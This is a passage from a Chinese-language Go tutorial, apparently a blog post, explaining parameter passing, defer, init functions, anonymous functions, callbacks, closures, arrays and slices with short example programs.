class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221119160834472.png" alt="image-20221119160834472"></p>
<p>注意事项:</p>
<ul>
<li>如果一个函数的参数是可变参数，同时还有其他的参数，可变参数要放在列表的最后一个函数的参数</li>
<li>列表中最多只能有一个可变参数。</li>
</ul>
<h3 id="参数传递">1.3.4. 参数传递</h3><p>按照数据的存储特点来分</p>
<ul>
<li>值类型的数据:操作的是数据本身、int、string、bool、float64、array、struct（传递的是数据）</li>
<li>引用类型的数据:操作的是数据的地址 slice（切片）、map、chan….（传递的是地址）</li>
</ul>
<h4 id="值传递">1.3.4.1. 值传递</h4><ul>
<li>值传递的实质是拷贝，在不修改原变量的情况下，重新复制出一份，再复制出来的部分进行修改</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 值传递</span></span><br><span class="line">	<span class="comment">// arr2 的数据是 从arr1 复制来的,所以是不同的空间</span></span><br><span class="line">	<span class="comment">// 修改 arr2 并不会影 arr 1</span></span><br><span class="line">	<span class="comment">// 定义一个数组 [个数]类型&#123;num1,num2...&#125;</span></span><br><span class="line">	arr := [<span class="number">4</span>]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;main的数组为%d\n&quot;</span>, arr)</span><br><span class="line">	<span class="comment">// 传递==&gt;拷贝，拷贝了arr数组到arr2,内存空间不通过，所以arr2修改了但实际arr数组并未被修改</span></span><br><span class="line">	update(arr)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;update调用后main的数组为%d\n&quot;</span>, arr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">update</span><span class="params">(arr2 [4]<span class="type">int</span>)</span></span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;update接受到的数组为%d\n&quot;</span>, arr2)</span><br><span class="line">	arr2[<span class="number">0</span>] = <span class="number">100</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;update修改后的数组为%d\n&quot;</span>, arr2)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221119170334176.png" alt="image-20221119170334176"></p>
<h4 id="引用传递">1.3.4.2. 引用传递</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 切片的定义方式即没有大小限制的数组</span></span><br><span class="line">	s1 := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;main的数组为%d\n&quot;</span>, s1)</span><br><span class="line">	<span class="comment">// 切片数据被调用实际指向的是同一块内存空间，所以被调用之后修改了，原数据也会修改</span></span><br><span class="line">	update2(s1)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;切片被调用修改后main的数组为%d\n&quot;</span>, s1)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">update2</span><span class="params">(s2 []<span class="type">int</span>)</span></span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;切片接受到的数组为%d\n&quot;</span>, s2)</span><br><span class="line">	s2[<span class="number">0</span>] = <span class="number">100</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;切片修改后的数组为%d\n&quot;</span>, s2)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221119201527228.png" alt="image-20221119201527228"></p>
<h3 id="函数中变量的作用域">1.3.5. 函数中变量的作用域</h3><ul>
<li>局部变量<ul>
<li>只能在定义的函数内使用，不能跨函数调用</li>
</ul>
</li>
<li>全局变量<ul>
<li>可以全局调用</li>
<li>只能使用var定义全局变量，不能使用 :&#x3D;</li>
</ul>
</li>
</ul>
<h3 id="递归函数">1.3.6. 递归函数</h3><p>定义:一个函数自己调用自己，就叫做递归函数</p>
<p>注意:递归函数需要有一个出口，逐渐向出口靠近，没有出口就会形成死循环。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> s = recursion(<span class="number">5</span>)</span><br><span class="line">	<span class="built_in">print</span>(s)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 求阶乘</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">recursion</span><span class="params">(num <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> num == <span class="number">1</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> num * recursion(num<span class="number">-1</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221119204355386.png" alt="image-20221119204355386"></p>
<h3 id="defer">1.3.7. defer</h3><p>在go语言中，使用defer关键字来延迟一个函数或者方法的执行</p>
<ul>
<li>你可以在函数中添加多个defer语句，<strong>当函数执行到最后时，这些defer语句会按照逆序执行</strong>，最后该函数返回，特别是当你在进行一些打开资源的操作时，遇到错误需要提前返回，在返回前你需要关闭相应的资源，不然很容易造成资源泄露等问题</li>
<li>defer语句在在运行是参数就已经存放进去了,所以后续改变参数不会影响defer语句中的参数值</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">defer</span> fmt.Println(<span class="number">2</span>)</span><br><span class="line">	fmt.Println(<span class="number">3</span>)</span><br><span class="line">	<span class="keyword">defer</span> fmt.Println(<span class="number">4</span>)</span><br><span class="line">	fmt.Println(<span class="number">5</span>)</span><br><span class="line">	<span class="keyword">defer</span> fmt.Println(<span class="number">6</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">3</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">4</span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<p>defer的用法:</p>
<ul>
<li>对象.close() 临时文件的删除</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">文件.open()</span><br><span class="line"><span class="keyword">defer</span>.<span class="built_in">close</span>()</span><br><span class="line">读或写操作</span><br></pre></td></tr></table></figure>

<ul>
<li>go语言中关于异常的处理，使用 panic0) 和 recover()、<ul>
<li>panic 函数用于引发恐慌，导致程序中断执行</li>
<li>recover 函数用于恢复程序的执行，recover0) 语法上要求必须在 defer 中执行。</li>
</ul>
</li>
</ul>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221119222728571.png" alt="image-20221119222728571"></p>
<h3 id="init函数">1.3.8. init函数</h3><p> init 函数，先于main 函数执行，实现包级别的一些初始化操作；</p>
<ul>
<li>init函数先于main函数自动执行，不能被其他函数调用；</li>
<li>init函数没有输入参数、返回值；</li>
<li>每个包可以有多个init函数；</li>
<li>包的每个源文件也可以有多个init函数，这点比较特殊；</li>
<li>同一个包的init执行顺序，golang没有明确定义，编程时要注意程序不要依赖这个执行顺序；</li>
<li>不同包的init函数按照包导入的依赖关系决定执行顺序。</li>
</ul>
<p>执行顺序  :  init函数–main函数</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;init执行&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	fmt.Println(<span class="string">&quot;main执行&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">init执行</span><br><span class="line">main执行</span><br></pre></td></tr></table></figure>

<h3 id="扩展">1.3.9. 扩展</h3><h4 id="函数的数据类型">1.3.9.1. 函数的数据类型</h4><ul>
<li><p>函数的类型对应的是他定义的参数以及返回值类型</p>
</li>
<li><p>可以定义函数型变量去接收另一个函数</p>
</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数本身就是数据类型</span></span><br><span class="line"><span class="comment">// 函数不加()就是一个变量</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%T\n&quot;</span>, f1) <span class="comment">// func(int, int)</span></span><br><span class="line">	<span class="comment">// 定义函数类型的变量</span></span><br><span class="line">	<span class="keyword">var</span> f2 <span class="function"><span class="keyword">func</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span></span> = f1</span><br><span class="line">	fmt.Println(f1) <span class="comment">// 0xdda260</span></span><br><span class="line">	fmt.Println(f2) <span class="comment">// 0xdda260  内存地址相同m,实际操作的是同一数据</span></span><br><span class="line">	f2(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">f1</span><span class="params">(a, b <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">	fmt.Println(a, b)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221120101416742.png" alt="image-20221120101416742"></p>
<h4 id="匿名函数">1.3.9.2. 匿名函数</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 匿名函数</span></span><br><span class="line">	f1 := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;我是匿名函数1&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	f1()</span><br><span class="line">	<span class="comment">// 匿名函数自己调用自己,只执行一次</span></span><br><span class="line">	<span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;我是匿名函数2&quot;</span>)</span><br><span class="line">	&#125;()</span><br><span class="line"></span><br><span class="line">	num := <span class="function"><span class="keyword">func</span><span class="params">(a, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> a + b</span><br><span class="line">	&#125;(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">	fmt.Println(num)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221120102307888.png" alt="image-20221120102307888"></p>
<p>Go语言是支持函数式编程:</p>
<p>1、将匿名函数作为另外一个函数的参数，回调函数</p>
<p>2、将匿名函数作为另外一个函数的返回值，可以形成闭包结构</p>
<h4 id="回调函数">1.3.9.3. 回调函数</h4><p>高阶函数: 根据go语言的数据类型的特点，可以将一个函数作为另外一个函数的参数。</p>
<p>fun1()，fun2()</p>
<p>将fun1函数作为 fun2 这个函数的参数</p>
<p>fun2函数: 就叫做高阶函数，接收了一个函数作为参数的函数</p>
<p>fun1函数: 就叫做回调函数，作为另外一个函数的参数</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 正常调用</span></span><br><span class="line">	fmt.Println(add1(<span class="number">1</span>, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 使用高阶函数调用其他函数</span></span><br><span class="line">	fmt.Println(oper(<span class="number">2</span>, <span class="number">2</span>, add1))</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 高阶函数调用匿名函数</span></span><br><span class="line">	num := oper(<span class="number">16</span>, <span class="number">2</span>, <span class="function"><span class="keyword">func</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> b == <span class="number">0</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> a / b</span><br><span class="line">	&#125;)</span><br><span class="line">	fmt.Println(num)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 高阶函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">oper</span><span class="params">(a, b <span class="type">int</span>, fun <span class="keyword">func</span>(<span class="type">int</span>, <span class="type">int</span>)</span></span> <span class="type">int</span>) <span class="type">int</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> fun(a, b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 回调函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add1</span><span class="params">(a, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> a + b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221120104043812.png" alt="image-20221120104043812"></p>
<ul>
<li><input disabled type="checkbox"> 使用回调函数与高阶函数实现加减乘除</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 加法</span></span><br><span class="line">	s1 := calc(<span class="number">2</span>, <span class="number">3</span>, <span class="function"><span class="keyword">func</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> a + b</span><br><span class="line">	&#125;)</span><br><span class="line">	fmt.Println(s1) <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 减法</span></span><br><span class="line">	s2 := calc(<span class="number">5</span>, <span class="number">3</span>, <span class="function"><span class="keyword">func</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> a - b</span><br><span class="line">	&#125;)</span><br><span class="line">	fmt.Println(s2) <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 乘法</span></span><br><span class="line">	s3 := calc(<span class="number">5</span>, <span class="number">3</span>, <span class="function"><span class="keyword">func</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> a * b</span><br><span class="line">	&#125;)</span><br><span class="line">	fmt.Println(s3) <span class="comment">// 15</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 除法</span></span><br><span class="line">	s4 := calc(<span class="number">9</span>, <span class="number">3</span>, <span class="function"><span class="keyword">func</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> b == <span class="number">0</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> a / b</span><br><span class="line">	&#125;)</span><br><span class="line">	fmt.Println(s4) <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">calc</span><span class="params">(a, b <span class="type">int</span>, fun <span class="keyword">func</span>(<span class="type">int</span>, <span class="type">int</span>)</span></span> <span class="type">int</span>) <span class="type">int</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> fun(a, b)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221120104843203.png" alt="image-20221120104843203"></p>
<h4 id="闭包">1.3.9.4. 闭包</h4><p>一个外层函数中，有内层函数，该内层函数中，会操作外层函数的局部变量</p>
<p>并且该外层函数的返回值就是这个内层函数。</p>
<p>这个内层函数和外层函数的局部变量，统称为闭包结构</p>
<p>局部变量的生命周期就会发生改变，正常的局部变量会随着函数的调用而创建，随着函数的结束而销毁但是闭包结构中的外层函数的局部变量并不会随着外层函数的结束而销毁，因为内层函数还在继续使用</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 因为increment的返回值类型为func(),所以如果只调用increment()打印出来的是内存地址</span></span><br><span class="line">	f1 := increment()</span><br><span class="line">	fmt.Println(f1()) <span class="comment">// 1</span></span><br><span class="line">	fmt.Println(f1()) <span class="comment">// 2</span></span><br><span class="line">	fmt.Println(f1()) <span class="comment">// 3</span></span><br><span class="line">	<span class="comment">// 创建f2去接收时，f1已经被销毁了但其中的变量并没有销毁，与其他变量互不影响</span></span><br><span class="line">	f2 := increment()</span><br><span class="line">	fmt.Println(f2()) <span class="comment">// 1</span></span><br><span class="line">	fmt.Println(f1()) <span class="comment">// 4</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">increment</span><span class="params">()</span></span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">int</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> i <span class="type">int</span> = <span class="number">0</span></span><br><span class="line">	<span class="comment">// 此处fun匿名函数效果等于i++,因为将fun进行返回,返回值为int，所以increment的返回值类型要为func() int</span></span><br><span class="line">	fun := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">int</span> &#123;</span><br><span class="line">		i++</span><br><span class="line">		<span class="keyword">return</span> i</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> fun</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="数组">1.4. 数组</h2><ul>
<li>数组是<strong>相同数据类型</strong>的一组数据的集合，数组一但定义<strong>长度不能修改</strong>，数组可以<strong>通过下标</strong>(或者叫索引)来访问或修改元素。</li>
</ul>
<h3 id="数组的声明与初始化">1.4.1. 数组的声明与初始化</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 数组的声明 var array [num] type</span></span><br><span class="line">	<span class="keyword">var</span> a1 [<span class="number">3</span>]<span class="type">int</span></span><br><span class="line">	<span class="keyword">var</span> a2 [<span class="number">3</span>]<span class="type">string</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;a1:%T\n&quot;</span>, a1)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;a2:%T\n&quot;</span>, a2)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 初始化数组 var array = [num] type&#123;num1,num2,num3...&#125;</span></span><br><span class="line">	<span class="keyword">var</span> a3 = [<span class="number">3</span>]<span class="type">float64</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">4.5</span>&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;a3:%v\n&quot;</span>, a3)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ...省略数组的长度,根据定义的数量自动决定数组的大小</span></span><br><span class="line">	<span class="keyword">var</span> a4 = [...]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">	fmt.Println(<span class="built_in">len</span>(a4))</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 通过索引的方式来初始化</span></span><br><span class="line">	<span class="comment">// 将索引为1即第二个数值赋值为2，将索引为3即第二个数值赋值为4，其他未赋值参数为默认值 =&gt; [0,2,0,4]</span></span><br><span class="line">	<span class="keyword">var</span> a5 = [...]<span class="type">int</span>&#123;<span class="number">1</span>: <span class="number">2</span>, <span class="number">3</span>: <span class="number">4</span>&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;a5:%v\n&quot;</span>, a5)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221121222447851.png" alt="image-20221121222447851"></p>
<h3 id="访问数组元素">1.4.2. 访问数组元素</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 通过下标（索引）访问</span></span><br><span class="line">	<span class="keyword">var</span> a1 [<span class="number">2</span>]<span class="type">int</span></span><br><span class="line">	a1[<span class="number">0</span>] = <span class="number">10</span></span><br><span class="line">	a1[<span class="number">1</span>] = <span class="number">20</span></span><br><span class="line">	fmt.Println(a1)</span><br><span class="line">	<span class="comment">// 通过普通for遍历</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(a1); i++ &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;a1[%v]:%v\n&quot;</span>, i, a1[i])</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 通过for range遍历, i = 索引 , v = 索引对应的值</span></span><br><span class="line">	<span class="keyword">for</span> i, v := <span class="keyword">range</span> a1 &#123;</span><br><span class="line">		fmt.Println(i, v)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221121223327553.png" alt="image-20221121223327553"></p>
<h3 id="切片（Slice）">1.4.3. 切片（Slice）</h3><p>可以把切片理解为，<strong>可变长度的数组</strong>，其实它底层就是使用数组实现的，增加了自动扩容功能。切片 (Slice) 是一个拥有<strong>相同类型</strong>元素的可变长度的序列。</p>
<ul>
<li>len()打印切片的长度,cap()打印切片的容量</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 定义切片 var slice [] type,方法1</span></span><br><span class="line">	<span class="keyword">var</span> s1 []<span class="type">int</span></span><br><span class="line">	<span class="keyword">var</span> s2 []<span class="type">string</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;%v&quot;</span>, s1)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%v&quot;</span>, s2)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// var name = make([]type,len),make已经分配内存,方法2</span></span><br><span class="line">	<span class="keyword">var</span> s3 = <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">3</span>)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%v&quot;</span>, s3)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// len()打印切片的长度,cap()打印切片的容量</span></span><br><span class="line">	<span class="comment">//s4 := []int&#123;1, 2, 3&#125;</span></span><br><span class="line">	<span class="keyword">var</span> s4 = []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line">	fmt.Println(<span class="built_in">len</span>(s4))</span><br><span class="line">	fmt.Println(<span class="built_in">cap</span>(s4))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="切片的初始化">1.4.3.1. 切片的初始化</h4><ul>
<li>直接初始化</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 直接初始化</span></span><br><span class="line">	<span class="keyword">var</span> s1 []<span class="type">int</span></span><br><span class="line">	fmt.Println(s1)</span><br></pre></td></tr></table></figure>

<ul>
<li>使用数组初始化</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用数组初始化</span></span><br><span class="line">	<span class="keyword">var</span> a1 = [<span class="number">3</span>]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">	s2 := a1[:] <span class="comment">// 获取数组的全部元素</span></span><br><span class="line">	fmt.Println(s2)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用数组的部分初始化，左闭又开</span></span><br><span class="line">	s3 := a1[<span class="number">2</span>:]  <span class="comment">// 取索引2开始到结束前一个</span></span><br><span class="line">	s4 := a1[:<span class="number">2</span>]  <span class="comment">// 取索引0-1</span></span><br><span class="line">	s5 := a1[<span class="number">1</span>:<span class="number">2</span>] <span class="comment">// 取索引1-1</span></span><br><span class="line">	fmt.Println(s3)</span><br><span class="line">	fmt.Println(s4)</span><br><span class="line">	fmt.Println(s5)</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221122205702713.png" alt="image-20221122205702713"></p>
<h4 id="切片的遍历">1.4.3.2. 切片的遍历</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> s1 = []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line">	<span class="comment">// for range 遍历</span></span><br><span class="line">	<span class="keyword">for</span> i, v := <span class="keyword">range</span> s1 &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;%v,%v\n&quot;</span>, i, v)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0,1</span><br><span class="line">1,2</span><br><span class="line">2,3</span><br><span class="line">3,4</span><br></pre></td></tr></table></figure>

